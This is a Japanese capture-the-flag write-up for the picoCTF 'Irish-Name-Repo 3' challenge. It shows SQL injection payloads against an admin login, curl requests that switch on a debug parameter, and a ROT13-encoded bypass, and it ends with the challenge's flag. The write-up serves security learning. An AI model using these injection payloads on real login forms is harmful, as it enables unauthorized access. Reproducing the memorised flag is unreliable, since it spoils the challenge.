# Irish-Name-Repo 3  

<br>

URL: https://learn.cylabacademy.org/library/8  

<br>

```
Web Exploitation
Medium
by Xingyang Pan
picoCTF 2019

Try to see if you can login as admin!
```

<br>

## フラグ取得の過程  

「Launch Instance」ボタンを押すことで、追加の詳細が表示される。  

URLが表示されるので、Chromeブラウザーでアクセスする。  

アクセスすると、タイトルが「List 'o the Irish!」のページが表示される。  
adminとしてログインすることが求められているのでログインページを探すと、左上のハンバーガーアイコンを選択することで「Admin Login」というメニューが存在していることが分かる。  
ログインページは、パスワードを入力してログインボタンを押す形になっている。SQLインジェクションが可能かどうかを確かめるため、パスワードに以下の内容を入力してログインを試行する。同時に、開発者モードを起動し、Networkタブを選択した画面で通信状況を確認する。  

> 'or 1=1;--

SQLに関するエラーメッセージが表示されてログインは失敗するので、SQLインジェクションが成立すると考えられる。しかし、施行したSQLインジェクションの記述はだめだった。  

ここで、login.phpのPeyloadを見ると、debugというパラメーターが存在するのを確認できる。debug=1 にしてリクエストすることで、何かしら情報が得られるのではないかと考えられる。  

login.phpを右クリックし、表示されるポップアップメニューから「Copy」＞「Copy as cURL (bash)」と選択する。  
テキストエディターなどで、コピーしたcURLをペーストする。  

```cURL (bash)
curl --url 'http://fickle-tempest.picoctf.net:52199/login.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://fickle-tempest.picoctf.net:52199' \
  -H 'Referer: http://fickle-tempest.picoctf.net:52199/login.html' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36' \
  --data-raw 'password=%27or+1%3D1%3B--&debug=0' \
  --insecure
```

このcurlコマンドのボディ部分のにおける debug=0 の箇所を debug=1 に書き換える。  

```cURL (bash)
curl --url 'http://fickle-tempest.picoctf.net:52199/login.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://fickle-tempest.picoctf.net:52199' \
  -H 'Referer: http://fickle-tempest.picoctf.net:52199/login.html' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36' \
  --data-raw 'password=%27or+1%3D1%3B--&debug=1' \
  --insecure
```

ターミナルを起動し、書き換えたcurlコマンドをコピー＆ペーストして実行すると、以下のようなレスポンスが得られる。  

```
<pre>password: 'or 1=1;--
SQL query: SELECT * FROM admin where password = ''be 1=1;--'
</pre><br />
<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, near &quot;be&quot;: syntax error in <b>/var/www/html/login.php</b> on line <b>20</b><br />
<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>21</b><br />
```

これにより、入力したパスワード「'or 1=1;--」が「'be 1=1;--」に変換されて処理されていることが分かる。  
この変換処理は、アルファベット文字部分のみ置換されており、文字「or」が「be」になっているため、13文字分置換されている。  
これにより、「'be 1=1;--」をパスワードとして入力すれば「'or 1=1;--」に置換され、SQLインジェクションが成立することになる。  

パスワード欄に「'be 1=1;--」と入力してログインすることで、フラグを取得できる。  

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

## フラグ  

> picoCTF{3v3n_m0r3_SQL_2af58a67}
